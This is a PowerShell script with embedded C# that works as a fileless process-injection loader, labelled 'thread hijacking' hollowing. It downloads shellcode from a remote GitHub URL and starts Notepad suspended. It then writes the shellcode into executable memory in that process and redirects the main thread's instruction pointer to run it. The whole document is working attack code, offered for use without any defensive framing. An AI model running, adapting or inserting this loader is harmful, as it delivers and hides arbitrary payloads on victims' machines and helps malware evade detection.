<#
    PROJECT: Fileless Process Hollowing (Thread Hijacking Edition)
    PURPOSE: True Hollowing to mimic the C++ logic exactly.
#>

# --- CONFIGURATION ---
$PayloadUrl = "https://raw.githubusercontent.com/stumbs/NotePadInjection/main/payload.bin"


# --- THE C# ENGINE ---
$Code = @"
using System;
using System.Runtime.InteropServices;
using System.Net;
using System.ComponentModel;

public class HollowingLoader {
    
    // --- API IMPORTS ---
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);

    // [CRITICAL] These are the APIs for Thread Hijacking
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool GetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool SetThreadContext(IntPtr hThread, ref CONTEXT64 lpContext);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint ResumeThread(IntPtr hThread);

    // --- STRUCTURES ---
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO {
        public uint cb;
        public IntPtr lpReserved;
        public IntPtr lpDesktop;
        public IntPtr lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION { 
        public IntPtr hProcess; 
        public IntPtr hThread; 
        public int dwProcessId; 
        public int dwThreadId; 
    }

    // Context Struct for x64 (Required for SetThreadContext)
    [StructLayout(LayoutKind.Aligned, Pack = 16)]
    public struct CONTEXT64 {
        public ulong P1Home;
        public ulong P2Home;
        public ulong P3Home;
        public ulong P4Home;
        public ulong P5Home;
        public ulong P6Home;
        public uint ContextFlags;
        public uint MxCsr;
        public ushort SegCs;
        public ushort SegDs;
        public ushort SegEs;
        public ushort SegFs;
        public ushort SegGs;
        public ushort SegSs;
        public uint EFlags;
        public ulong Dr0;
        public ulong Dr1;
        public ulong Dr2;
        public ulong Dr3;
        public ulong Dr6;
        public ulong Dr7;
        public ulong Rax;
        public ulong Rcx;
        public ulong Rdx;
        public ulong Rbx;
        public ulong Rsp;
        public ulong Rbp;
        public ulong Rsi;
        public ulong Rdi;
        public ulong R8;
        public ulong R9;
        public ulong R10;
        public ulong R11;
        public ulong R12;
        public ulong R13;
        public ulong R14;
        public ulong R15;
        public ulong Rip; // The Instruction Pointer (This is what we change!)
    }

    public static void Execute(string url) {
        try {
            Console.WriteLine("[*] Downloading Payload...");
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
            WebClient wc = new WebClient();
            byte[] shellcode = wc.DownloadData(url);
            if (shellcode.Length == 0) return;

            Console.WriteLine("[*] Spawning Notepad (Suspended)...");
            STARTUPINFO si = new STARTUPINFO();
            si.cb = (uint)Marshal.SizeOf(si);
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            
            // Start Notepad Suspended (0x4)
            if (!CreateProcess(@"C:\Windows\System32\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi)) {
                Console.WriteLine("[-] Failed to create process."); return;
            }

            Console.WriteLine("[*] Allocating RWX Memory...");
            IntPtr remoteMem = VirtualAllocEx(pi.hProcess, IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40);

            Console.WriteLine("[*] Writing Payload...");
            IntPtr bytesWritten;
            WriteProcessMemory(pi.hProcess, remoteMem, shellcode, (uint)shellcode.Length, out bytesWritten);

            // --- THE HIJACKING (This is the missing step!) ---
            Console.WriteLine("[*] Hijacking Main Thread Context...");
            
            CONTEXT64 ctx = new CONTEXT64();
            ctx.ContextFlags = 0x100003; // CONTEXT_FULL (x64)
            
            if (!GetThreadContext(pi.hThread, ref ctx)) {
                Console.WriteLine("[-] Failed to get context."); return;
            }

            // Point the CPU (RIP register) to our payload
            ctx.Rip = (ulong)remoteMem.ToInt64();
            
            if (!SetThreadContext(pi.hThread, ref ctx)) {
                Console.WriteLine("[-] Failed to set context."); return;
            }

            Console.WriteLine("[*] Resuming Thread (Payload takes over)...");
            ResumeThread(pi.hThread);
            
            Console.WriteLine("[+] Hollowing Complete.");
        }
        catch (Exception e) {
            Console.WriteLine("[-] Error: " + e.Message);
        }
    }
}
"@

# --- EXECUTION ---
Write-Host "[*] Compiling Loader..." -ForegroundColor Cyan
Add-Type -TypeDefinition $Code -Language CSharp
[HollowingLoader]::Execute($PayloadUrl)

Write-Host "`n[!] Done." -ForegroundColor Cyan
Read-Host "Press ENTER..."
